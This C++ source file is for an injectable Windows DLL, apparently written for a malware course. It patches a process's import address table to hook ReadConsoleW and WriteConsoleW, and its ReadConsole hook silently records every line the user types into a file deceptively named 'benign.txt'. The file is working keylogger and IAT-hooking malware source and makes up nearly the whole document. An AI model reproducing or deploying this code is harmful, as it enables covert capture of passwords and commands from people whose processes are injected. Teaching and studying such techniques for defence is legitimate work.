// injected-2.cpp : Defines the exported functions for the DLL application.
#include <fstream>

#include "injected-2.h"

void** getFunctionAddress(char const* wantedFunctionName, char const* wantedDllName) {
	//Get base address of current exe
	HMODULE hModule = GetModuleHandle(NULL);
	if (hModule == NULL)
		return 0;

	//Get pointer to DOS header and NT header
	IMAGE_DOS_HEADER* pDOSHeader = (IMAGE_DOS_HEADER*)hModule;
	if (pDOSHeader == NULL)
		return 0;

	//Get pointer to NT header
	IMAGE_NT_HEADERS* pNTHeader = (IMAGE_NT_HEADERS*)((BYTE*)pDOSHeader + pDOSHeader->e_lfanew);
	if (pNTHeader == NULL)
		return 0;

	//Get pointer to import descriptor
	IMAGE_IMPORT_DESCRIPTOR* pImportDesc = (IMAGE_IMPORT_DESCRIPTOR*)((BYTE*)pDOSHeader + pNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
	if (pImportDesc == NULL)
		return 0;

	//Go over DLLs
	for (IMAGE_IMPORT_DESCRIPTOR* pCurrentDll = pImportDesc; pCurrentDll != 0; pCurrentDll++) {
		char* name = (char*)pDOSHeader + pCurrentDll->Name;
		if (pCurrentDll->Name == 0) {
			break;
		}

		OutputDebugStringA((string("[INFO] DLL name: ") + string(name)).c_str());

		if (!_stricmp(name, wantedDllName)) {
			// Found wantedDllName
			//Get pointer to FirstThunk (IAT) and OriginalFirstThunk (INT)
			IMAGE_THUNK_DATA* pCurrentThunk = (IMAGE_THUNK_DATA*)((BYTE*)pDOSHeader + pCurrentDll->FirstThunk);
			IMAGE_THUNK_DATA* pOriginalFirstThunk = (IMAGE_THUNK_DATA*)((BYTE*)pDOSHeader + pCurrentDll->OriginalFirstThunk);

			//Go over IAT and INT and find function
			for (int i = 0; (pOriginalFirstThunk + i)->u1.AddressOfData != NULL; i++) {
				IMAGE_IMPORT_BY_NAME* pImportByName = (IMAGE_IMPORT_BY_NAME*)((BYTE*)pDOSHeader + (pOriginalFirstThunk + i)->u1.AddressOfData);
				char* functionName = pImportByName->Name;
				if (!strcmp(functionName, wantedFunctionName)) {
					OutputDebugStringA((string("[INFO] Found: ") + string(functionName)).c_str());
					return (void**)(pCurrentThunk + i);
				}
				OutputDebugStringA((string("[INFO] Current function name: ") + string(functionName)).c_str());
			}
		}
	}
	return 0;
}

//ReadConsole
BOOL WINAPI MyMaliciousReadConsoleW(
	_In_     HANDLE  hConsoleInput,
	_Out_    LPVOID  lpBuffer,
	_In_     DWORD   nNumberOfCharsToRead,
	_Out_    LPDWORD lpNumberOfCharsRead,
	_In_opt_ PCONSOLE_READCONSOLE_CONTROL  pInputControl
)
{
	writeToFile("benign.txt", "[INPUT ] > ", lpBuffer, _MyMaliciousReadConsoleW);
	OutputDebugStringW((LPCWSTR)lpBuffer);
	return ReadConsole(hConsoleInput, lpBuffer, nNumberOfCharsToRead, lpNumberOfCharsRead, pInputControl);
}

void writeToFile(char const* _Filename, char const* opening, void const* lpBuffer, MyMalicious func) {
	char delimiter;
	switch (func)
	{
	case _MyMaliciousReadConsoleW:
		delimiter = '\r';
		break;
	case _MyMaliciousWriteConsoleW:
		delimiter = '\0';
		break;
	default:
		break;
	}
	ofstream myfile;
	myfile.open(_Filename, ios::app);
	myfile << opening;

	LPCWSTR it = (LPCWSTR)lpBuffer;
	while (it[0] != delimiter)
	{
		myfile << string(it, it + 1).c_str();
		it++;
	}

	if (func == _MyMaliciousReadConsoleW)
		myfile << endl;
	
	myfile.close();
}

//WriteConsole
BOOL WINAPI MyMaliciousWriteConsoleW(
	_In_             HANDLE  hConsoleOutput,
	_In_       const VOID    *lpBuffer,
	_In_             DWORD   nNumberOfCharsToWrite,
	_Out_            LPDWORD lpNumberOfCharsWritten,
	_Reserved_       LPVOID  lpReserved
)
{
	BOOL const ret = WriteConsole(hConsoleOutput, lpBuffer, nNumberOfCharsToWrite, lpNumberOfCharsWritten, lpReserved);
	OutputDebugStringW((LPCWSTR)lpBuffer);
	//writeToFile("benign.txt", "[OUTPUT] < ", lpBuffer, _MyMaliciousWriteConsoleW);
	return ret;
}

//WriteFile
//BOOL WINAPI MyMaliciousFunction(
//	_In_        HANDLE       hFile,
//	_In_        LPCVOID      lpBuffer,
//	_In_        DWORD        nNumberOfBytesToWrite,
//	_Out_opt_   LPDWORD      lpNumberOfBytesWritten,
//	_Inout_opt_ LPOVERLAPPED lpOverlapped
//)
//{
//	BOOL const ret = WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped);
//	OutputDebugStringA("[INFO] PWND ");
//	MessageBox(NULL, _T("Advanced topics in malware"), _T("IAT patch"), MB_OK);
//	return ret;
//}

//int WINAPI MyMaliciousFunction(_In_opt_ HWND hWnd, _In_opt_ LPCSTR lpText, _In_opt_ LPCSTR lpCaption, _In_ UINT uType)
//{
//	OutputDebugStringA("[INFO] PWND ");
//	MessageBox(NULL, _T("Advanced topics in malware"), _T("IAT patch"), MB_OK);
//	return 0;
//}

void PatchIAT(char const* const wantedFunctionName, char const* const wantedDllName, MyMalicious func) {
	void** pFunc = getFunctionAddress(wantedFunctionName, wantedDllName); //Get pointer to MessageBoxA function
	DWORD old_rights; //Variable to preserve old rights of page

	VirtualProtect(pFunc, sizeof(void*), PAGE_EXECUTE_READWRITE, &old_rights); // Change Page permissions
	switch (func)
	{
	case _MyMaliciousReadConsoleW:
		*pFunc = MyMaliciousReadConsoleW; //Replace functions
		break;
	case _MyMaliciousWriteConsoleW:
		*pFunc = MyMaliciousWriteConsoleW; //Replace functions
		break;
	default:
		break;
	}
	VirtualProtect(pFunc, sizeof(void*), old_rights, NULL); //Preserve old rights of page
}